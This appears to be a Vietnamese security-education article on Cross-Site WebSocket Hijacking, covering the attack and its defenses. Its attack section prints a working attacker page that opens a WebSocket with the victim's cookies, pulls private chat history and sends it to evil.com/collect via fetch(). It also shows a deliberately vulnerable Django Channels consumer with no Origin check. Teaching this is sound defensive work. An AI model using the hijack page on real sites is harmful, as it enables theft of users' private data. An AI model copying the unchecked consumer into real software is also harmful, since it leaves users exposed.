# Cross-Site WebSocket Hijacking (CSWSH)

> **CWE**: CWE-1385 | **Phân loại**: Client-Side Attacks

## Kiến thức Nền tảng

Bình thường, khi bạn duyệt web, trình duyệt hoạt động theo kiểu hỏi-đáp: bạn gửi một yêu cầu (request), máy chủ trả về một phản hồi (response) rồi kết thúc. Tuy nhiên, với các ứng dụng thời gian thực như nhắn tin (chat) hay bảng giá chứng khoán, cơ chế này quá chậm chạp. Để giải quyết, công nghệ WebSocket ra đời, giúp mở ra một đường ống liên lạc thông suốt hai chiều giữa trình duyệt và máy chủ. Khi bắt đầu thiết lập đường ống này (quá trình handshake), trình duyệt sẽ gửi kèm cookie xác thực của bạn. Điểm đặc biệt là WebSocket không bị ràng buộc bởi Chính sách đồng nguồn gốc (SOP), nghĩa là một trang web lạ cũng có thể gửi yêu cầu mở kết nối WebSocket đến máy chủ của bạn.

```http
GET /chat HTTP/1.1
Host: app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://app.example.com
Cookie: session=abc123def456
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Điểm quan trọng: handshake là một **HTTP request thông thường** — trình duyệt tự động gửi kèm cookie. Header `Origin` được trình duyệt thêm vào nhưng **server phải tự kiểm tra** — nếu không, bất kỳ trang web nào cũng có thể mở WebSocket đến server của bạn với cookie của nạn nhân.

Khác với AJAX (bị Same-Origin Policy chặn), WebSocket **không bị SOP hạn chế** — trình duyệt cho phép bất kỳ origin nào mở kết nối WebSocket đến bất kỳ server nào. Đây là nguyên nhân gốc rễ của CSWSH.

## Mô tả lỗ hổng

Lỗ hổng Cross-Site WebSocket Hijacking (hay CSWSH) xảy ra khi máy chủ WebSocket "nhắm mắt" chấp nhận mọi yêu cầu kết nối mà không thèm kiểm tra xem yêu cầu đó đến từ trang web nào (bỏ qua tiêu đề `Origin`), đồng thời chỉ dựa vào cookie tự động gửi kèm để xác thực người dùng. Kẻ tấn công có thể dụ dỗ bạn truy cập vào một trang web độc hại của họ. Trang web này sẽ âm thầm gửi yêu cầu mở kết nối WebSocket tới tài khoản của bạn trên máy chủ đích. Vì trình duyệt tự động đính kèm cookie của bạn, kết nối sẽ được thiết lập thành công dưới danh nghĩa của bạn. Khác với CSRF thông thường chỉ gửi đi một lệnh đơn lẻ, cuộc tấn công này nguy hiểm hơn gấp nhiều lần vì nó mở ra một đường ống hai chiều: kẻ tấn công có thể liên tục gửi lệnh và đọc toàn bộ dữ liệu phản hồi riêng tư của bạn trong thời gian thực.

## Cơ chế tấn công

**Bước 1 — Kẻ tấn công tạo trang khai thác:**

```html
<!-- Attacker's page: https://evil.com/hijack.html -->
<!-- Victim visits this page while logged into vulnerable-app.com -->
<script>
  // Browser sends victim's cookies with the handshake
  var ws = new WebSocket("wss://vulnerable-app.com/chat");

  ws.onopen = function() {
    console.log("Connected with victim's session!");
    // Send commands as the victim
    ws.send(JSON.stringify({
      action: "get_chat_history",
      room: "private"
    }));
  };

  ws.onmessage = function(event) {
    // Receive victim's private data
    var data = JSON.parse(event.data);
    
    // Exfiltrate to attacker's server
    fetch("https://evil.com/collect", {
      method: "POST",
      body: JSON.stringify({
        stolen: data,
        timestamp: Date.now()
      })
    });
  };
</script>
```

**Bước 2 — Server dễ tổn thương:**

```python
# Vulnerable WebSocket server (Python/Django Channels)
# ❌ No Origin header validation
class ChatConsumer(WebsocketConsumer):
    def connect(self):
        # Only checks session cookie — automatically sent by browser
        user = self.scope["user"]
        if user.is_authenticated:
            self.accept()  # Accepts connection from ANY origin
        else:
            self.close()

    def receive(self, text_data):
        data = json.loads(text_data)
        if data["action"] == "get_chat_history":
            # Returns private messages to whoever connects
            history = Message.objects.filter(room=data["room"])
            self.send(text_data=json.dumps({
                "messages": [m.content for m in history]
            }))
```

## Biện pháp phòng thủ

- **Tóm tắt**: Xác thực tiêu đề Origin trong quá trình bắt tay WebSocket và sử dụng cơ chế xác thực dựa trên token chống CSRF.
- **Các bước chi tiết**:
  - Kiểm tra Origin header trong handshake để đảm bảo yêu cầu kết nối đến từ domain được cho phép.
  - Sử dụng token xác thực ngẫu nhiên, không trùng lặp (CSRF token) được truyền qua handshake hoặc thông điệp đầu tiên.
  - Triển khai xác thực dựa trên token (Token-based auth) thay vì chỉ tin tưởng vào Cookie.

## Code Example

```python
# ❌ VULNERABLE: No origin check, cookie-only auth
class NotificationConsumer(WebsocketConsumer):
    def connect(self):
        if self.scope["user"].is_authenticated:
            self.accept()  # Any website can hijack this

# ✅ SECURE: Origin validation + token-based auth
class NotificationConsumer(WebsocketConsumer):
    ALLOWED_ORIGINS = ["https://myapp.com"]
    
    def connect(self):
        # Check Origin header
        headers = dict(self.scope["headers"])
        origin = headers.get(b"origin", b"").decode()
        
        if origin not in self.ALLOWED_ORIGINS:
            self.close(code=4003)
            return
        
        # Require token-based authentication (not just cookies)
        query = parse_qs(self.scope["query_string"].decode())
        token = query.get("token", [None])[0]
        
        if not validate_ws_token(token, self.scope["user"]):
            self.close(code=4001)
            return
        
        self.accept()
```

## Xem thêm

- [PostMessage Exploitation](../postmessage-exploitation/) — Các vấn đề bảo mật Client-Side.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
- CWE: https://cwe.mitre.org/data/definitions/1385.html
- Christian Schneider: https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html

## Giải thích thuật ngữ

- **WebSocket**: Giao thức hỗ trợ truyền dữ liệu hai chiều (full-duplex) liên tục qua một kết nối TCP duy nhất.
- **CSWSH (Cross-Site WebSocket Hijacking)**: Tấn công chiếm quyền kết nối WebSocket của người dùng từ một trang web độc hại chéo trang.
- **Handshake**: Quá trình khởi tạo thiết lập kết nối ban đầu giữa client và server.
- **Origin Header**: Tiêu đề HTTP tự động điền bởi trình duyệt chỉ ra tên miền gửi yêu cầu.
- **Full-Duplex**: Chế độ truyền tin hai chiều diễn ra đồng thời cùng lúc.
